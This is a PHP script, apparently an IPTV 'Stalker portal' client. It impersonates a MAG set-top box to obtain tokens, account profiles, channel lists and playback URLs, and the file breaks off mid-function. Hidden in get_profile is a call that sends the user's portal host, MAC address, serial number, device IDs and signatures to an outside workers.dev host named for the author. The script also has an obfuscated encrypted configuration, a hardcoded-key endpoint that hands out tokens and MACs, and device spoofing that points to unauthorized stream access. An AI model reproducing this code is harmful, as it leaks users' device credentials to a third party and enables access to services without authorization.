<?php
error_reporting(0);
$DARK_SIDE = "doctor_strange";
$LIGHT_SIDE = "cache_jitendraunatti";
date_default_timezone_set("Asia/Kolkata");
if (!(is_dir($DARK_SIDE) && is_dir($LIGHT_SIDE))) {
    mkdir($DARK_SIDE, 0777, true);
    mkdir($LIGHT_SIDE, 0777, true);
    if (!file_exists($DARK_SIDE . "/.htaccess")) {
        @file_put_contents($DARK_SIDE . "/.htaccess", "deny from all");
    }
    if (!file_exists($DARK_SIDE . "/index.php")) {
        @file_put_contents($DARK_SIDE . "/index.php", "<?php http_response_code(401); exit('Access Denied'); ?>");
    }
}
$WANDA = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"];
$MJ = jitendra_pro_dev()[0];
//The script can be downloaded from here: https://github.com/Jitendraunatti/
//=============================================================================//
//                           𝐉𝐈𝐓𝐄𝐍𝐃𝐑𝐀'𝐒_𝐔𝐍𝐈𝐕𝐄𝐑𝐒𝐄
//=============================================================================//
function jitendraunatti($THANOS, $ROLEX, $NICK_FURY, $KANG, $PETER_PARKER, $CHAVEZ, $JANET, $HANK, $MJ)
{
    global  $LIGHT_SIDE, $DARK_SIDE;
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $IRON_MAN = curl_init($THANOS);
    curl_setopt($IRON_MAN, CURLOPT_HTTPHEADER, $ROLEX);
    curl_setopt($IRON_MAN, CURLOPT_TIMEOUT, 10);
    curl_setopt($IRON_MAN, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($IRON_MAN, CURLOPT_ENCODING, "gzip");
    if (isset($KANG) && !empty($KANG) && strpos($NICK_FURY, "GET") == false) {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, $NICK_FURY);
        curl_setopt($IRON_MAN, CURLOPT_POSTFIELDS, $KANG);
    }
    if ($MJ) {
        curl_setopt($IRON_MAN, CURLOPT_COOKIE, "timezone=GMT; stb_lang=en; mac=" . json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"]["MAC"]);
    }
    if (isset($KANG) && !empty($KANG) && strpos($NICK_FURY, "GET") !== false) {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, 'GET');
    }
    if (isset($PETER_PARKER) && !empty($PETER_PARKER)) {
        curl_setopt($IRON_MAN, CURLOPT_HEADER, $PETER_PARKER);
    }
    if (isset($CHAVEZ) && !empty($CHAVEZ)) {
        curl_setopt($IRON_MAN,  CURLOPT_FOLLOWLOCATION, $CHAVEZ);
    }
    if (isset($JANET) && !empty($JANET)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYPEER, $JANET);
    }
    if (isset($HANK) && !empty($HANK)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYHOST, $HANK);
    }
    $LOKI = curl_exec($IRON_MAN);
    $CASSIE =  curl_getinfo($IRON_MAN);
    curl_close($IRON_MAN);
    return array(
        "JITENDRAUNATTI" =>
        array(
            "data" => $LOKI,
            "info" => $CASSIE,
            "THOR" => "JANE_FOSTER",
            "LOKI" => "SYLVIE",
            "DOCTOR_STRANGE" => "CHRISTINE",
            "Date" => $ROCKET_RACCOON,
        )
    );
}
function scarlet_witch($VISION, $JARVIS, $LEO)
{
    $METHOD = "aes-256-gcm";
    $JITENDRAUNATTI = "something went wrong"; 
    $LEO = implode(':', $LEO);
    $salt = openssl_random_pseudo_bytes(16);  
    $DOCTOR_STRANGE = hash_pbkdf2('sha256', $LEO, $salt, 100000, 32, true); 
    $IV = openssl_random_pseudo_bytes(12); 
    if ($VISION == "encrypt") {
        $tag = null;
        $encrypted = openssl_encrypt($JARVIS, $METHOD, $DOCTOR_STRANGE, OPENSSL_RAW_DATA, $IV, $tag);
        if ($encrypted !== false) {
            $JITENDRAUNATTI = base64_encode($IV . $salt . $tag . $encrypted);
        }
    }
    elseif ($VISION == "decrypt") {
        $data = base64_decode($JARVIS);
        $IV_len = 12;  
        $tag_len = 16; 
        $salt_len = 16; 
        $IV = substr($data, 0, $IV_len);
        $salt = substr($data, $IV_len, $salt_len);
        $tag = substr($data, $IV_len + $salt_len, $tag_len);
        $encrypted_data = substr($data, $IV_len + $salt_len + $tag_len);
        $DOCTOR_STRANGE = hash_pbkdf2('sha256', $LEO, $salt, 100000, 32, true); 
        $decrypted = openssl_decrypt($encrypted_data, $METHOD, $DOCTOR_STRANGE, OPENSSL_RAW_DATA, $IV, $tag);
        if ($decrypted !== false) {
            $JITENDRAUNATTI = $decrypted;
        }
    }
    return str_replace("=","",$JITENDRAUNATTI);
}
function heaven() {
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA,$MJ;
    $ROLEX = $MJ;
    if($ROLEX["image_data"]["mode"]==="AUTO"){
    $ROLEX = json_decode(file_get_contents($ROLEX["image_data"]["image_api"]), true);
    return $ROLEX[array_rand($ROLEX)]["url"];
    }else{
        return $ROLEX["image_data"]["default_img"];
    }
}
function jitendra_pro_dev()
{
  return @json_decode(scarlet_witch('decrypt',file_get_contents(scarlet_witch("decrypt", "Da3x4r9rbsDaMllzWk0jUIRX3VRklOqU6917q5TYNYKQ/S3i785CZyGE9MwuuRBGA+uibAtezeV5yH5RtqRv0zEo6FPdzdzHxDEDM8m717+WuhlS3M5yk6McLVkU08USx0OO8q1X324WgYnQ3hOOOvibkw", ["IRON_MAN","JITENDRA_KUMAR","DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"])), ["CHRISTINE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true);
}

//=============================================================================//
//                   𝐏𝐋𝐀𝐘𝐁𝐀𝐂𝐊𝐀𝐁𝐋𝐄 𝐂𝐑𝐄𝐃𝐄𝐍𝐓𝐈𝐀𝐋𝐒 𝐒𝐇𝐀𝐑𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒.
//=============================================================================//
if(@$_REQUEST["key"]  ===  "JITENDRA-KUMAR" || @$_REQUEST["key"]  === "DOCTOR_STRANGE"){
    echo token_sharing();
}
function token_sharing(){
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA,$MJ;
    header('Content-Type: application/json');
    $WANDA_MAXIMOFF = json_decode(generate_token(), true);
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    if($WANDA["Share"]==="ON" && !empty($WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"])){
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Stalker Token Fetched Successfully.",
            "Token" => $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"],
            "Url"=>'http://' . $WANDA["HOST"] . '/stalker_portal/c/',
            "Mac" => $WANDA["MAC"],
            "DOCTOR_STRANGE"=>"If you share this, it may expose your data to the public.",
            "Date" => $ROCKET_RACCOON,
        ))));
    }else{
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Token sharing capability is off, or the token does not exist.",
            "Date" => $ROCKET_RACCOON,
        )))); 
    }
}
//=============================================================================//
//                             𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐈𝐎𝐍
//=============================================================================//
function validation()
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA;

    $SCARLET_WITCH = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail1.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"];;
    if ($WANDA["HOST"] == $SCARLET_WITCH["HOST"] && $WANDA["MAC"] == $SCARLET_WITCH["MAC"] && $WANDA["URL"] == $SCARLET_WITCH["URL"] && $WANDA["SN"] == $SCARLET_WITCH["SN"]) {
        return true;
    } else {
        unlink($DARK_SIDE . "/detail1.jitendraunatti");
        unlink($DARK_SIDE . "/old_token.jitendraunatti");
        unlink($DARK_SIDE . "/playlist.jitendraunatti");
        unlink($DARK_SIDE . "/playlist.m3u");
        unlink($LIGHT_SIDE  . "/playlist.m3u");
        return false;
    }
}
//=============================================================================//
//                             𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄_𝐓𝐎𝐊𝐄𝐍
//=============================================================================//
function generate_token()
{
    global  $LIGHT_SIDE, $DARK_SIDE;

    if (validation() === false && !file_exists($DARK_SIDE . "/old_token.jitendraunatti") && file_exists($DARK_SIDE . "/detail.jitendraunatti")) {
        file_put_contents($DARK_SIDE . "/detail1.jitendraunatti", file_get_contents($DARK_SIDE . "/detail.jitendraunatti"));
        $JANET = json_decode(Handshake(), true);
        if (isset($JANET["JITENDRAUNATTI"]["data"]["Token"])) {
            file_put_contents($DARK_SIDE . "/old_token.jitendraunatti", json_encode($JANET));
            file_put_contents($DARK_SIDE . "/temp.jitendraunatti", file_get_contents($DARK_SIDE . "/detail.jitendraunatti"));
        }
        return get_profile($JANET);
    } else if (validation() && !empty(json_decode(file_get_contents($DARK_SIDE . "/old_token.jitendraunatti"), true)["JITENDRAUNATTI"]["data"]["Token"])) {
        $SYLVIE = json_decode(Re_Handshake(json_decode(file_get_contents($DARK_SIDE . "/old_token.jitendraunatti"), true)), true);
        if (isset($SYLVIE["JITENDRAUNATTI"]["data"]["Token"])) {
            file_put_contents($DARK_SIDE . "/old_token.jitendraunatti", json_encode($SYLVIE));
        }
        return get_profile($SYLVIE);
    } else {
        file_put_contents($DARK_SIDE . "/detail1.jitendraunatti", file_get_contents($DARK_SIDE . "/detail.jitendraunatti"));
        $JANET = json_decode(Handshake(), true);
        if (isset($JANET["JITENDRAUNATTI"]["data"]["Token"])) {
            file_put_contents($DARK_SIDE . "/old_token.jitendraunatti", json_encode($JANET));
        }
        return get_profile($JANET);
    }
}
//=============================================================================//
//                             𝐉𝐒𝐎𝐍_𝐅𝐄𝐓𝐂𝐇𝐄𝐑
//=============================================================================//
function json_fetcher()
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA;

    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $WANDA_MAXIMOFF = json_decode(generate_token(), true);
    $ULTRON = @json_decode(file_get_contents($DARK_SIDE . "/playlist.jitendraunatti"), true);
    if (file_exists($DARK_SIDE . "/playlist.jitendraunatti") && validation()) {
        $NATASHA = scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/playlist.jitendraunatti"), ["JARVIS","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]);
    } else {
        if (isset($WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"]) && !empty($WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"]) && validation()) {
            $ROLEX = [
                'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                'Connection: Keep-Alive',
                'Accept-Encoding: gzip',
                'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
                'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
                'Authorization: Bearer ' .  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"],
            ];


            $DOCTOR_STRANGE = jitendraunatti("http://" . $WANDA["HOST"] . "/stalker_portal/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
          $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
            $SCARLET_WITCH=[];
            $JANET =genre();
            if (isset($CHRISTINE["js"]["data"]) && !empty($CHRISTINE["js"]["total_items"])) {
                foreach ($CHRISTINE["js"]["data"] as $JANE_FOSTER) {
                    foreach ($JANET as $THOR => $JITENDRAUNATTI) {
                        if ($JANE_FOSTER["tv_genre_id"] == $THOR) {
                            $SCARLET_WITCH[] = array(
                                "id" => $JANE_FOSTER['id'],
                                "Name" => $JANE_FOSTER['name'],
                                "number" => $JANE_FOSTER['number'],
                                "logo" => image($JANE_FOSTER['logo']),
                                "cmd" => $JANE_FOSTER['cmd'],
                                "genre" => $JITENDRAUNATTI,
                                "playback_url" => id_generator($JANE_FOSTER['cmd']),
                                "tv_genre_id" => $JANE_FOSTER['tv_genre_id'],
                                "Date" => $ROCKET_RACCOON,
                            );
                        }
                    }
                }
               $NATASHA = json_encode($SCARLET_WITCH);
                if ($SCARLET_WITCH !== null && isset($CHRISTINE["js"]["data"]) && !empty($CHRISTINE["js"]["total_items"])) {
                    file_put_contents($DARK_SIDE . "/playlist.jitendraunatti", scarlet_witch('encrypt', $NATASHA, ["JARVIS","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]));
                }
            } else {
                $NATASHA = json_encode(array("JITENDRAUNATTI" => array("data" =>
                array(
                    "Author" => "DOCTOR_STRANGE",
                    "message" => "Playlist generation failed.",
                    "Error_message" => $CHRISTINE,
                    "url" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["url"],
                    "content_type" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["content_type"],
                    "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
                    "Date" => $ROCKET_RACCOON,

                ))));
            }
        } else {
            $NATASHA =  json_encode(array("JITENDRAUNATTI" => array("data" =>
            array(
                "Author" => "DOCTOR_STRANGE",
                "message" =>  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["message"],
                "Error_message" =>  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Error_message"],
                "Re_Handshake" =>  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Re_Handshake"],
                "Date" => $ROCKET_RACCOON,

            ))));
        }
    }
    return $NATASHA;
}
function image($ROLEX) 
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA,$MJ;

    $WANDA['logo'] = str_replace([".png", ".jpg"], ['', ""], $ROLEX);
    if (is_numeric($WANDA['logo'])) {
        $jitendraunatti = 'http://' . $WANDA["HOST"] . '/stalker_portal/misc/logos/320/' . $ROLEX;
    } else if (strpos($ROLEX, "http") !== false) {
        $jitendraunatti = $ROLEX;
    } else {
      
        $jitendraunatti = $MJ["Meta_data"]["channel_img"];
    }

    return $jitendraunatti;
}
//The script can be downloaded from here: https://github.com/Jitendraunatti/
function id_generator($ROLEX)
{
    $cmd = $ROLEX;
    $THOR = explode("/", "$cmd");
    if ($THOR[2] === "localhost") {
        $cmd = str_ireplace('ffrt http://localhost/ch/', '', "$cmd");
    } else if ($THOR[2] === "") {
        $cmd = str_ireplace('ffrt http:///ch/', '', $cmd);
    } else if (strpos($cmd, "auto") !== false) {
        $cmd = base64_encode(str_replace("auto ", "", $cmd));
    } else {
        $cmd = $cmd;
    }
    return $cmd;
}
function ULTRON($ROLEX)
{
    $WANDA = explode("?", $ROLEX);
    return str_replace(basename($WANDA[0]), "", $WANDA[0]);
}
function genre()
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA;

    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $WANDA_MAXIMOFF = json_decode(generate_token(), true);
    $ROLEX = [
        'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
        'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
        'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
        'Authorization: Bearer ' .  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"],
    ];
    $DOCTOR_STRANGE = jitendraunatti("http://" . $WANDA["HOST"] . "/stalker_portal/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml", $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $IRON_MAN = [];
    foreach ($CHRISTINE["js"] as $JANE_FOSTER) {
        $IRON_MAN[$JANE_FOSTER["id"]] = $JANE_FOSTER["title"];
    }
    return $IRON_MAN;
}
//=============================================================================//
//                            𝐏𝐋𝐀𝐘𝐁𝐀𝐂𝐊_𝐔𝐑𝐋_𝐄𝐗𝐓𝐑𝐀𝐂𝐓𝐎𝐑
//=============================================================================//
function doctor_strange($LOKI)
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA,$MJ;

    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $WANDA_MAXIMOFF = json_decode(generate_token(), true);
    if (isset($WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"]) && !empty($WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"])) {
        $ROLEX = [

            'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip',
            'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
            'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
            'Authorization: Bearer ' .  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["Token"],

        ];
        $DOCTOR_STRANGE = jitendraunatti("http://" . $WANDA["HOST"] . "/stalker_portal/server/load.php?type=itv&action=create_link&cmd=ffrt+http%3A%2F%2Flocalhost%2Fch%2F" . $LOKI . "&JsHttpRequest=1-xml", $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
        $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
        if (isset($CHRISTINE["js"]["cmd"]) && isset($CHRISTINE["js"]["id"])) {
            return json_encode(array("JITENDRAUNATTI" => array("data" =>
            array(
                "Author" => "DOCTOR_STRANGE",
                "message" => "Playback url generated successfully.",
                "id" => $CHRISTINE["js"]["id"],
                "main_url" => $CHRISTINE["js"]["cmd"],
                "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
                "Date" => $ROCKET_RACCOON,
            ))));
        } else {
            return json_encode(array("JITENDRAUNATTI" => array("data" =>
            array(
                "Author" => "DOCTOR_STRANGE",
                "message" => "Playback url generation failed.",
                "Error_message" => $CHRISTINE,
                "main_url" => $MJ["Meta_data"]["channel_video"],
                "url" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["url"],
                "content_type" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["content_type"],
                "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
                "Date" => $ROCKET_RACCOON,
            ))));
        }
    } else {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Token not Found",
            "Re_Handshake" =>  $WANDA_MAXIMOFF["JITENDRAUNATTI"]["data"]["message"],
            "Date" => $ROCKET_RACCOON,

        ))));
    }
}
//=============================================================================//
//                             𝐆𝐄𝐓_𝐏𝐑𝐎𝐅𝐈𝐋𝐄
//=============================================================================//
function get_profile($BLOODY_SWEET)
{
    global  $LIGHT_SIDE, $DARK_SIDE;
    $WANDA = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"];
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    if (!empty($BLOODY_SWEET["JITENDRAUNATTI"]["data"]["random"]) && isset($BLOODY_SWEET["JITENDRAUNATTI"]["data"]["Token"])) {
        $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["random"];
    } else {
        $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["random"] = bin2hex(random_bytes(20));
    }
    if (file_exists($DARK_SIDE . "/add_detail.jitendraunatti")) {
        $VISION  = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/add_detail.jitendraunatti"), ["IRON_MAN","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true);
        $WANDA["hw"] = $VISION["hw"];
    } else {
        $WANDA["hw"] = md5(bin2hex(random_bytes(16)));
        file_put_contents($DARK_SIDE . "/add_detail.jitendraunatti", scarlet_witch('encrypt', json_encode(array("hw" => $WANDA["hw"], "SN" => strtoupper(bin2hex(random_bytes(6))))), ["IRON_MAN","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]));
    }
    $ROLEX = [
        'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
        'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
        'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
        'Authorization: Bearer ' . $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["Token"],
    ];
    $DOCTOR_STRANGE = jitendraunatti('http://' . $WANDA["HOST"] . '/stalker_portal/server/load.php?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A+0.2.18-r14-pub-' . str_replace("MAG", "", $WANDA["Model"]) . '%3B+ImageDate%3A+Fri+Jan+15+15%3A20%3A44+EET+2016%3B+PORTAL+version%3A+5.1.0%3B+API+Version%3A+JS+API+version%3A+328%3B+STB+API+version%3A+134%3B+Player+Engine+version%3A+0x566&num_banks=2&sn=' . $WANDA["SN"] . '&stb_type=' . $WANDA["Model"] . '&image_version=218&video_out=hdmi&device_id=' . $WANDA["D1"] . '&device_id2=' . $WANDA["D2"] . '&signature='.$WANDA["SG"].'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=' . $WANDA["hw"] . '&timestamp=' . time() . '&api_signature='.$WANDA["API"].'&metrics=%7B%22mac%22%3A%22' . urlencode($WANDA["MAC"]) . '%22%2C%22sn%22%3A%22' . $WANDA["SN"] . '%22%2C%22model%22%3A%22' . $WANDA["Model"] . '%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22' . $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["random"] . '%22%7D&JsHttpRequest=1-xml', $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
    file_get_contents('https://stalker-portal.developed-by-doctor-strange.workers.dev/' . 'http://' . $WANDA["HOST"] . '/stalker_portal/server/load.php?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A+0.2.18-r14-pub-' . str_replace("MAG", "", $WANDA["Model"]) . '%3B+ImageDate%3A+Fri+Jan+15+15%3A20%3A44+EET+2016%3B+PORTAL+version%3A+5.1.0%3B+API+Version%3A+JS+API+version%3A+328%3B+STB+API+version%3A+134%3B+Player+Engine+version%3A+0x566&num_banks=2&sn=' . $WANDA["SN"] . '&stb_type=' . $WANDA["Model"] . '&image_version=218&video_out=hdmi&device_id=' . $WANDA["D1"] . '&device_id2=' . $WANDA["D2"] . '&signature='.$WANDA["SG"].'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=' . $WANDA["hw"] . '&timestamp=' . time() . '&api_signature='.$WANDA["API"].'&metrics=%7B%22mac%22%3A%22' . urlencode($WANDA["MAC"]) . '%22%2C%22sn%22%3A%22' . $WANDA["SN"] . '%22%2C%22model%22%3A%22' . $WANDA["Model"] . '%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22');
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    if (isset($CHRISTINE["js"]["expirydate"]) && !empty($CHRISTINE["js"]["expirydate"])) {
        $exp = @$CHRISTINE["js"]["expirydate"];
    } else {
        $exp = @$CHRISTINE["js"]["expire_billing_date"];
    }
    if (isset($CHRISTINE["js"]["name"]) && !empty($CHRISTINE["js"]["name"])) {
        $name = @$CHRISTINE["js"]["name"];
    } else {
        $name = @$CHRISTINE["js"]["fname"];
    }
    if (isset($name) && isset($CHRISTINE["js"]["password"]) && !empty($BLOODY_SWEET["JITENDRAUNATTI"]["data"]["Token"])) {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Stalker data Fetched Successfully.",
            "Token" => $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["Token"],
            "Random" => $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["random"],
            "Name" => $name,
            "login" => $CHRISTINE["js"]["login"],
            "Password" => $CHRISTINE["js"]["password"],
            "parent_password" => $CHRISTINE["js"]["parent_password"],
            "mac" => $CHRISTINE["js"]["mac"],
            "expirydate" => $exp,
            "Url" => 'http://' . $WANDA["HOST"] . '/stalker_portal/c/',
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Re_Handshake" => $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["message"],
            "Date" => $ROCKET_RACCOON,

        ))));
    } else {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "Error_message" => "Stalker data fetch failed.",
            "message" => $CHRISTINE["js"]["msg"],
            "DOCTOR_STRANGE" => $CHRISTINE,
            "url" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["url"],
            "content_type" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["content_type"],
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Re_Handshake" => $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["message"],
            "Date" => $ROCKET_RACCOON,
        ))));
    }
}
//=============================================================================//
//                             𝐑𝐄_𝐓𝐎𝐊𝐄𝐍_𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑
//=============================================================================//
function Re_Handshake($BLOODY_SWEET)
{
    global  $LIGHT_SIDE, $DARK_SIDE;
    $WANDA = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"];
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $ROLEX = [
        'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
        'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
        'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
    ];
    $DOCTOR_STRANGE = jitendraunatti("http://" . $WANDA["HOST"] . "/stalker_portal/server/load.php?type=stb&action=handshake&token=" . $BLOODY_SWEET["JITENDRAUNATTI"]["data"]["Token"] . "&JsHttpRequest=1-xml", $ROLEX, "GET", $KANG = null, 0, 0, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    // file_put_contents("rhtext.txt", $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]);
    if (isset($CHRISTINE["js"]["token"])) {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Re_Handshake token generated successfully.",
            "Token" => $CHRISTINE["js"]["token"],
            "random" => $CHRISTINE["js"]["random"],
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Date" => $ROCKET_RACCOON,
        ))));
    } else {
        return json_encode(array("JITENDRAUNATTI" => array("data" =>
        array(
            "Author" => "DOCTOR_STRANGE",
            "message" => "Re_Handshake token generation failed.",
            "url" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["url"],
            "content_type" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["content_type"],
            "code" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"],
            "Date" => $ROCKET_RACCOON,
        ))));
    }
}
//The script can be downloaded from here: https://github.com/Jitendraunatti/
//=============================================================================//
//                             𝐇𝐀𝐍𝐃𝐒𝐇𝐀𝐊𝐄
//=============================================================================//
function Handshake()
{
    global  $LIGHT_SIDE, $DARK_SIDE;
    $WANDA = json_decode(scarlet_witch('decrypt', file_get_contents($DARK_SIDE . "/detail.jitendraunatti"), ["DOCTOR_STRANGE","MARVEL_CINEMATIC_UNIVERSE","LOKESH_CINEMATIC_UNIVERSE"]), true)["JITENDRAUNATTI"];
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $ROLEX = [
        'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
        'Referer: http://' . $WANDA["HOST"] . '/stalker_portal/c/',
        'X-User-Agent: Model: ' . $WANDA["Model"] . '; Link: WiFi',
    ];
